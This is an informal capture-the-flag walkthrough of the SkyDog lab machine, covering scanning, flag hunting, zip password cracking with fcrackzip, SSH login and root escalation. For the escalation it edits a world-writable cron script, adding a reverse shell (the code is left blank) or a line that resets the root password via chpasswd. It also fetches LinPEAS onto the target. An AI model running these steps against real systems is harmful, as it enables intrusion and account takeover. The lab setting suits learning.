first i found the ip from 
`nmap -sn  192.168.56.0/24`
and founf the ip 
192.168.56.117 and added it to the /etc/hosts
sudo nano /etc/hosts

then scanned the victim 
`nmap -p- -sV -sC skydog` 
and it displayed thee openports along with the version
```
PORT   STATE SERVICE
22/tcp open  ssh    OpenSSH 6.6.1p1
80/tcp open  http   pache httpd 2.4.7

```

then i tried looking if the versions are vulnerable finding exploits from searchsploit and i didnt find anything interesting there
then i went for the http and paste the url in web and i got a page with an image
then i checked for the source code of it and found nothing there and then i saved the image to my device and ran exiftool on it and found a flag



`exiftool SkyDogCon_CTF.jpg`
flag{abc40a2d4e023b42bd1ff04891549ae2}
 and put into crackstation and decrypted the hash 
 Welcome Home
 
then i looked for the sub directories using 
` dirb http://192.168.56.117/  `
and it gave robots.txt is there and then i checked it and found another flag there and decrypted it using crackstation

flag{cd4f10fcba234f0e8b2f60a490c306e6} - Bots

and in the robots.txt i gor so many sub directories and i found interesting for
/Setec/Astronomy
and when i navigate there i found a zip file,jpg file

![](attachments/Pasted%20image%2020260906172649.png)
i downloaded the image file and the zip file tested the image file using exiftool and there wasnt anything
and then i tried to unzip the file and it prompted for a password and to find the password i used

`└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt Whistler.zip 
`
it found the password as ==yourmother

and then i unziped the file
`unzip Whistler.zip `

and it extracted two files 
flag.txt 
QuesttoFindCosmo.txt
and then i read those files
```
cat flag.txt
flag{1871a3c1da602bf471d3d76cc60cdb9b}

cat QuesttoFindCosmo.txt 
Time to break out those binoculars and start doing some OSINT  

```

then decrypted the flag flag{1871a3c1da602bf471d3d76cc60cdb9b}  and got ==yourmother

then i navigated to the
/Setec 
and looked for the page source code and found something interesing 
NSA-Agent-Abbott"; AKA Darth Vader
and when i googled it i got a imdb web page https://www.imdb.com/title/tt0105435/characters/nm0070749/

then ran 

`cewl -d 0 -u 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'
https://www.imdb.com/title/tt0105435/ > skydog.txt 
`
and from the created wordlist i found an interesting sub directory through
`dirb skydog -w wordlist.txt`

/PlayTonics
and then i navigated to /PlayTonics and found another flag there and also a pcap file asw and i downloaded them 

flag{c07908a705c22922e6d416e0e1107d99} - leroybrown


and from the pcap i extracted a mp3 file and it contained
Hi. My Name Is Werner Brandes. My Voice Is My Passport. Verify Me

![](attachments/Pasted%20image%2020260906181638.png)


this hints about a user called werner brandes
then i tried to log in to the ssh using the last flag found as the password leroybrown

`ssh wernerbrandes@skydog
`
and there i found the next flag

flag{82ce8d8f5745ff6849fa7af1473c9b35}

then i tried to escalate priviledge

1. sudo -l returned nothing 
2. then i tried kernal exploitation
`uname -r` and it displayed the version that also didnt work 
 3. then i chekd SUID
`find / -perm -u=s -type f 2>/dev/null
`
and from the list it displayed and i tried different ones using payloads from GTFobins and those didnt work
4. then i tried **Following a checklist/methodology** `LinPEAS`

LinPEAS (Linux Privilege Escalation Awesome Script) is a script that runs dozens of enumeration checks  world-writable files, cron jobs, SUID binaries, credentials, kernel version exp

then i downloaded it to my kali machine 
`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`

and transfered it to the victim machine for that i started a python server in my kali machine
`python -m http.server 8080`

and copied to the victim machine
`wget http://192.168.56.102:8080/linpeas.sh
`
then gave it executing permision
`chmod +x linpeas.sh
`
and executed it
`./linpeas.sh`

and it displayed all the vulnerabilities and what i found there interesting is 
![](attachments/Pasted%20image%2020260906183600.png)


from this list i found ==/home/wernerbrandes ==
interesting and since it displayed not to run in home i navigated to /tmp

```
wernerbrandes@skydogctf:/tmp$ ls -lah /lib/log/sanitizer.py
-rwxrwxrwx 1 root root 96 Oct 27  2015 /lib/log/sanitizer.py
```

and i read the file
`wernerbrandes@skydogctf:/tmp$ cat /lib/log/sanitizer.py

```
!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()

```
`

found a reverse shell code and added it to the end 
`nano /lib/log/sanitizer.py`

```


```
and i start a listener in my kali machine
`nc -nlvp 1234 `
after a few time i got the reverse shell after executing the python code automatically  i input earlier 

and i got the root user and found the final flag

```
# whoami
root
# ls
BlackBox
# cd BlackBox
# ls
flag.txt
# cat flag.txt
flag{b70b205c96270be6ced772112e7dd03f}

Congratulations!! Martin Bishop is a free man once again!  Go here to receive your reward.
/CongratulationsYouDidIt#
```

![](attachments/Pasted%20image%2020260906191154.png)

OR THERE IS ANOTHER METHOD 
rather addind a reverse shell i can edit the sanitizer.py
 file in another way
so the file contained
```
wernerbrandes@skydogctf:/tmp$ cat /lib/log/sanitizer.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

and i edited this part with previously identified /etc/passwd in suid binaried

```
os.system('echo "root:12345678" | chpasswd')
```
and then i navigated to 
`wernerbrandes@skydogctf:/$ cd /etc/cron.daily`
and logged to root
`su root`

Cron.daily jobs don't run instantly or continuously — they run on a schedule (often via `anacron`, once every 24 hours, frequently overnight/early morning)


so it would take some time and later when i try to log into root again it works


and there there were another user calld ==nemo==
and went inside that folder and tried to escalate priviledged from the all the previous ,ethods and that asw didnt work and i went back to the  wernerbrandes
then i the 




